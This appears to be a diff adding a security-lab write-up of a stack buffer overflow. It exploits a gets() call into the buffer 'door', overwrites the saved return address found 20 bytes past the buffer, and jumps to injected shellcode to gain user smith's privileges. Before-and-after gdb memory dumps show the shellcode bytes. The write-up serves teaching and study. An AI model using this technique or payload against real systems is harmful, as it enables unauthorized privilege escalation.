@@ -1,0 +1,21 @@
+The vulnerability here is that gets reads characters from the stdin and writes them into door without reliable length constraints. We can exploit this by overwriting the return address such that it points to the shell code. 
+
+Calling info frame, we are able to find the location of the eip, which can be found at 0xbffff66c. Since the ‘door’ buffer is located at 0xbffff658, we can deduce that the eip is located twenty bytes after the beginning of the buffer. Noticing this, we add filler code to overwrite the 20 bytes after the beginning of door with junk before overwriting the eip with a return address that now points 4 bytes above its location. 
+
+4 bytes above the $eip, we can allocate the shell code into memory so that the return address points to our shell code. This ensures that we jump to the shell code at the end of the function, giving us access to the desired privileges of user smith. 
+
+Below is the before and after representation of the locations in memory that we are manipulating. The first segment portrays what the memory looks like prior to calling gets. The second segment portrays what the memory looks like after calling gets. We can see that after calling gets, the $eip at 0xbffff66c is pointing to 4 bytes directly above itself, and that we have overwritten memory such that the shellcode is located where the overwritten $eip is pointing. 
+
+(gdb) x/64x door
+0xbffff658:	0xbffff71c	0xb7e5f225	0xb7fed270	0x00000000
+0xbffff668:	0xbffff678	0x0804842a	0x08048440	0x00000000
+0xbffff678:	0x00000000	0xb7e454d3	0x00000001	0xbffff714
+0xbffff688:	0xbffff71c	0xb7fdc858	0x00000000	0xbffff71c
+0xbffff698:	0xbffff71c	0x00000000
+
+(gdb) x/64x door
+0xbffff658:	0x34333231	0x38373635	0x32313039	0x36353433
+0xbffff668:	0x30393837	0xbffff670	0x895e1feb	0xc0310876
+0xbffff678:	0x89074688	0x0bb00c46	0x4e8df389	0x0c568d08
+0xbffff688:	0xdb3180cd	0xcd40d889	0xffdce880	0x622fffff
+0xbffff698:	0x732f6e69	0x00000068
